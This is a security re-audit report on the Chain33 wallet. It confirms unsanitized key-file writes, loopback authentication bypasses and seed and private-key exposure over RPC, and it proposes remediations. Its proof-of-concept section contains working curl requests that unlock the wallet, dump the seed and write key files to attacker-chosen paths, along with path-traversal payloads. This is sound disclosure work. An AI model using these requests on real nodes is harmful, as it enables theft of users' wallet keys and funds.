# Chain33 Wallet File-Write + Key Theft — Adversarial Re-Audit (2026-08-16)

Source: `/tmp/audit_wallet.md` (AUDITOR-2). All line refs against `bysomeone/chain33@f4252a73`.

## Verdict

| Finding | Re-audit |
|---|---|
| Arbitrary file creation via `DumpPrivkeysFile` | CONFIRMED — no path sanitization |
| `os.Stat` prevents overwrite | WEAK — TOCTOU, attacker picks new path, `O_APPEND` without `O_EXCL` |
| `checkWalletStatus` blocks unauth | CONDITIONAL — requires `!IsWalletLocked && HasSeed`; bypass is `UnLock` RPC with wallet password, unauth from localhost |
| Path-traversal sanitized | NO — 0 `filepath.Clean/HasPrefix` hits |
| File content arbitrary | PARTIAL — `priv+label` encrypted with attacker `Passwd` as key; controls path+key, not arbitrary bytes |
| Direct key theft `GetSeed`/`DumpPrivkey` | CONFIRMED under same gate — higher impact than file write |

## Evidence Anchors

- `wallet/wallet_proc.go:1599 ProcDumpPrivkeysFile` — `os.Stat` before lock, `OpenFile(O_CREATE|O_APPEND|O_RDWR, 0666)` verbatim `fileName`
- `types/wallet.pb.go:1931 ReqPrivkeysFile{FileName,Passwd}` — fully attacker-controlled; `rpc/jrpchandler.go:968` + `grpchandler.go:427` pass through
- `wallet/wallet.go:424 checkWalletStatus` — `IsWalletLocked` atomic + `HasSeed`; gates 6+ sinks
- `wallet/wallet_proc.go:1012 ProcWalletUnLock` — `VerifyPasswordHash` or `wallet.Password` check, `WalletOrTicket=false` CAS unlocks, no rate-limit; `rpc/jrpchandler.go:616 UnLock`
- `rpc/server.go:171 checkBasicAuth` (empty→true), `:193 checkIPWhitelist` (IsLoopback→true), `:217 checkJrpcFuncWhitelist` (default `*`), `rpc/http.go:59,96,166` loopback bypass

## Reachability Matrix

- `127.0.0.1` loopback: IP PASS, BasicAuth PASS (default empty), func WL SKIPPED → reaches `UnLock→GetSeed/DumpPrivkey/DumpPrivkeysFile` with only password
- Remote default: DENY (only 127.0.0.1)
- Remote `whitelist=["*"]`: PASS; with BasicAuth set needs `Authorization: Basic`

## Checklist to Reproduce

```bash
grep -rn "filepath\|Clean\|HasPrefix" /tmp/chain33src/wallet/wallet_proc.go  # 0 → unsanitized
grep -n "os.Stat\|O_EXCL\|O_NOFOLLOW\|0666" /tmp/chain33src/wallet/wallet_proc.go
grep -n "checkWalletStatus" /tmp/chain33src/wallet/*.go
grep -n "ProcWalletUnLock\|WalletUnLock" /tmp/chain33src/wallet/*.go /tmp/chain33src/rpc/*.go
grep -rn "checkIPWhitelist\|checkBasicAuth\|checkJrpcFuncWhitelist\|IsLoopback" /tmp/chain33src/rpc --include="*.go"
```

## PoC

```bash
curl -s http://127.0.0.1:8801 -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"Chain33.UnLock","params":[{"passwd":"<wallet password>","walletOrTicket":false,"timeout":0}]}'
curl -s http://127.0.0.1:8801 -d '{"method":"Chain33.GetSeed","params":[{"passwd":"<same>"}]}'
curl -s http://127.0.0.1:8801 -d '{"method":"Chain33.DumpPrivkeysFile","params":[{"fileName":"/tmp/audit_pwn","passwd":"MyPass1234"}]}'
# /tmp/audit_pwn is 0666, AES-GCM with MyPass1234; decrypt with AesgcmDecrypter
# traversal: "../../tmp/pwn", "/var/tmp/cron_payload" — succeeds if not existing and writable
```

## Remediation Diff Sketch

```go
clean := filepath.Clean(fileName)
if !filepath.IsAbs(clean) { return types.ErrInvalidParam }
if !strings.HasPrefix(clean, filepath.Clean(baseDir)+string(os.PathSeparator)) { return types.ErrInvalidParam }
f, err := os.OpenFile(clean, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0600) // + O_NOFOLLOW / Lstat check
```
Also: remove loopback func-WL bypass for sensitive methods, require BasicAuth on loopback when configured, rate-limit `UnLock`, deprecate server-side file write.
